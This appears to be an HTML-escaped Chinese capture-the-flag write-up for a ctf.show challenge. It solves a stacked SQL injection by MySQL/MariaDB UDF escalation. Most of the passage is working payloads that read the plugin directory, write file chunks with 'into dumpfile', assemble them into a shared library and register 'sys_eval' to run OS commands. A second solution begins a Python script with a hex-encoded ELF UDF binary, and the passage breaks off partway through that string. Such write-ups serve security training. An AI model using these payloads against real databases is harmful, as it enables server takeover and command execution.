&lt;li&gt;把编译好的动态库放到 MySQL 的插件目录里（一般是 &lt;code&gt;/usr/lib/mysql/plugin/&lt;/code&gt; 或者配置文件里指定的 &lt;code&gt;plugin_dir&lt;/code&gt;），然后用 SQL 注册函数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看 MySQL 版本，确保 大于 5.1，因为从 5.1 开始 MySQL 引入了 plugin 机制，支持 UDF 动态库&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;select version();%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904153041868.png&#34; alt=&#34;image-20250904153041868&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询插件目录（&lt;code&gt;@@plugin_dir&lt;/code&gt;）&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;select @@plugin_dir;%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904153151792.png&#34; alt=&#34;image-20250904153151792&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linux 下动态库 &lt;code&gt;.so&lt;/code&gt; 的文件头是 &lt;code&gt;0x7f 45 4c 46&lt;/code&gt;，ASCII 是 &lt;code&gt;DEL ELF&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;由于单次注入写入太长的 payload 会失败，所以 WP 把动态库拆成 多段（1.txt、2.txt、3.txt ）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一次写入&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=1&amp;#39;;select &amp;#39;&amp;#39; into dumpfile &amp;#39;/usr/lib/mariadb/plugin/1.txt&amp;#39;%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904153318603.png&#34; alt=&#34;image-20250904153318603&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;验证是否写入成功&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;select load_file(&amp;#39;/usr/lib/mariadb/plugin/1.txt&amp;#39;)%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904154202481.png&#34; alt=&#34;image-20250904154202481&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二次写入&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=1&amp;#39;;select &amp;#39;&amp;#39; into dumpfile &amp;#39;/usr/lib/mariadb/plugin/2.txt&amp;#39;%23
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三次写入&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api/?id=1&amp;#39;;select &amp;#39;&amp;#39; into dumpfile &amp;#39;/usr/lib/mariadb/plugin/3.txt&amp;#39;%23
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;将三个文件的二进制数据内容拼接一个文件， 写入完整动态库 &lt;code&gt;love.so&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;select unhex(concat(load_file(&amp;#39;/usr/lib/mariadb/plugin/1.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/2.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/3.txt&amp;#39;))) into dumpfile &amp;#39;/usr/lib/mariadb/plugin/love.so&amp;#39;%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904153430635.png&#34; alt=&#34;image-20250904153430635&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为 UDF 命名 &lt;code&gt;sys_eval&lt;/code&gt;，声明函数的返回类型是字符串&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;create function sys_eval returns string soname &amp;#39;love.so&amp;#39;%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904153923044.png&#34; alt=&#34;image-20250904153923044&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;select sys_eval(&amp;#39;ls /&amp;#39;)%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904154630579.png&#34; alt=&#34;image-20250904154630579&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意flag文件名为 &lt;code&gt;flag.here/n&lt;/code&gt; ，需要使用通配符拿到flag内容&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id=1&amp;#39;;select sys_eval(&amp;#39;cat /fla*&amp;#39;)%23
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904155146495.png&#34; alt=&#34;image-20250904155146495&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904231319829.png&#34; alt=&#34;image-20250904231319829&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests

base_url=&amp;quot;http://f66ef7b3-e460-42fe-88e3-c575cb08fc86.challenge.ctf.show/api/&amp;quot;
payload = []
text = [&amp;quot;a&amp;quot;, &amp;quot;b&amp;quot;, &amp;quot;c&amp;quot;, &amp;quot;d&amp;quot;, &amp;quot;e&amp;quot;]
udf = &amp;quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180&amp;quot; \
&amp;quot;000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000&amp;quot; \
&amp;quot;000000000000000C414000000000000C41400000000000000002000000000000100000006000000C8140000000000&amp;quot; \
&amp;quot;00C814200000000000C81420000000000048020000000000005802000000000000000020000000000002000000060&amp;quot; \
&amp;quot;00000F814000000000000F814200000000000F8142000000000008001000000000000800100000000000008000000&amp;quot; \
&amp;quot;000000000400000004000000900100000000000090010000000000009001000000000000240000000000000024000&amp;quot; \
&amp;quot;00000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084&amp;quot; \
&amp;quot;000000000000008400000000000000040000000000000051E57464060000000000000000000000000000000000000&amp;quot; \
&amp;quot;00000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E&amp;quot; \
&amp;quot;5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A80000000011000000110000000200000007000000800802488&amp;quot; \
&amp;quot;11944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000&amp;quot; \
&amp;quot;001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E787&amp;quot; \
&amp;quot;22788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1C&amp;quot; \
&amp;quot;C3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000&amp;quot; \
&amp;quot;000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000&amp;quot; \
&amp;quot;000000250000002000000000000000000000000000000000000000CD0000001200000000000000000000000000000&amp;quot; \
&amp;quot;0000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000&amp;quot; \
&amp;quot;000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000&amp;quot; \
&amp;quot;000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000&amp;quot; \
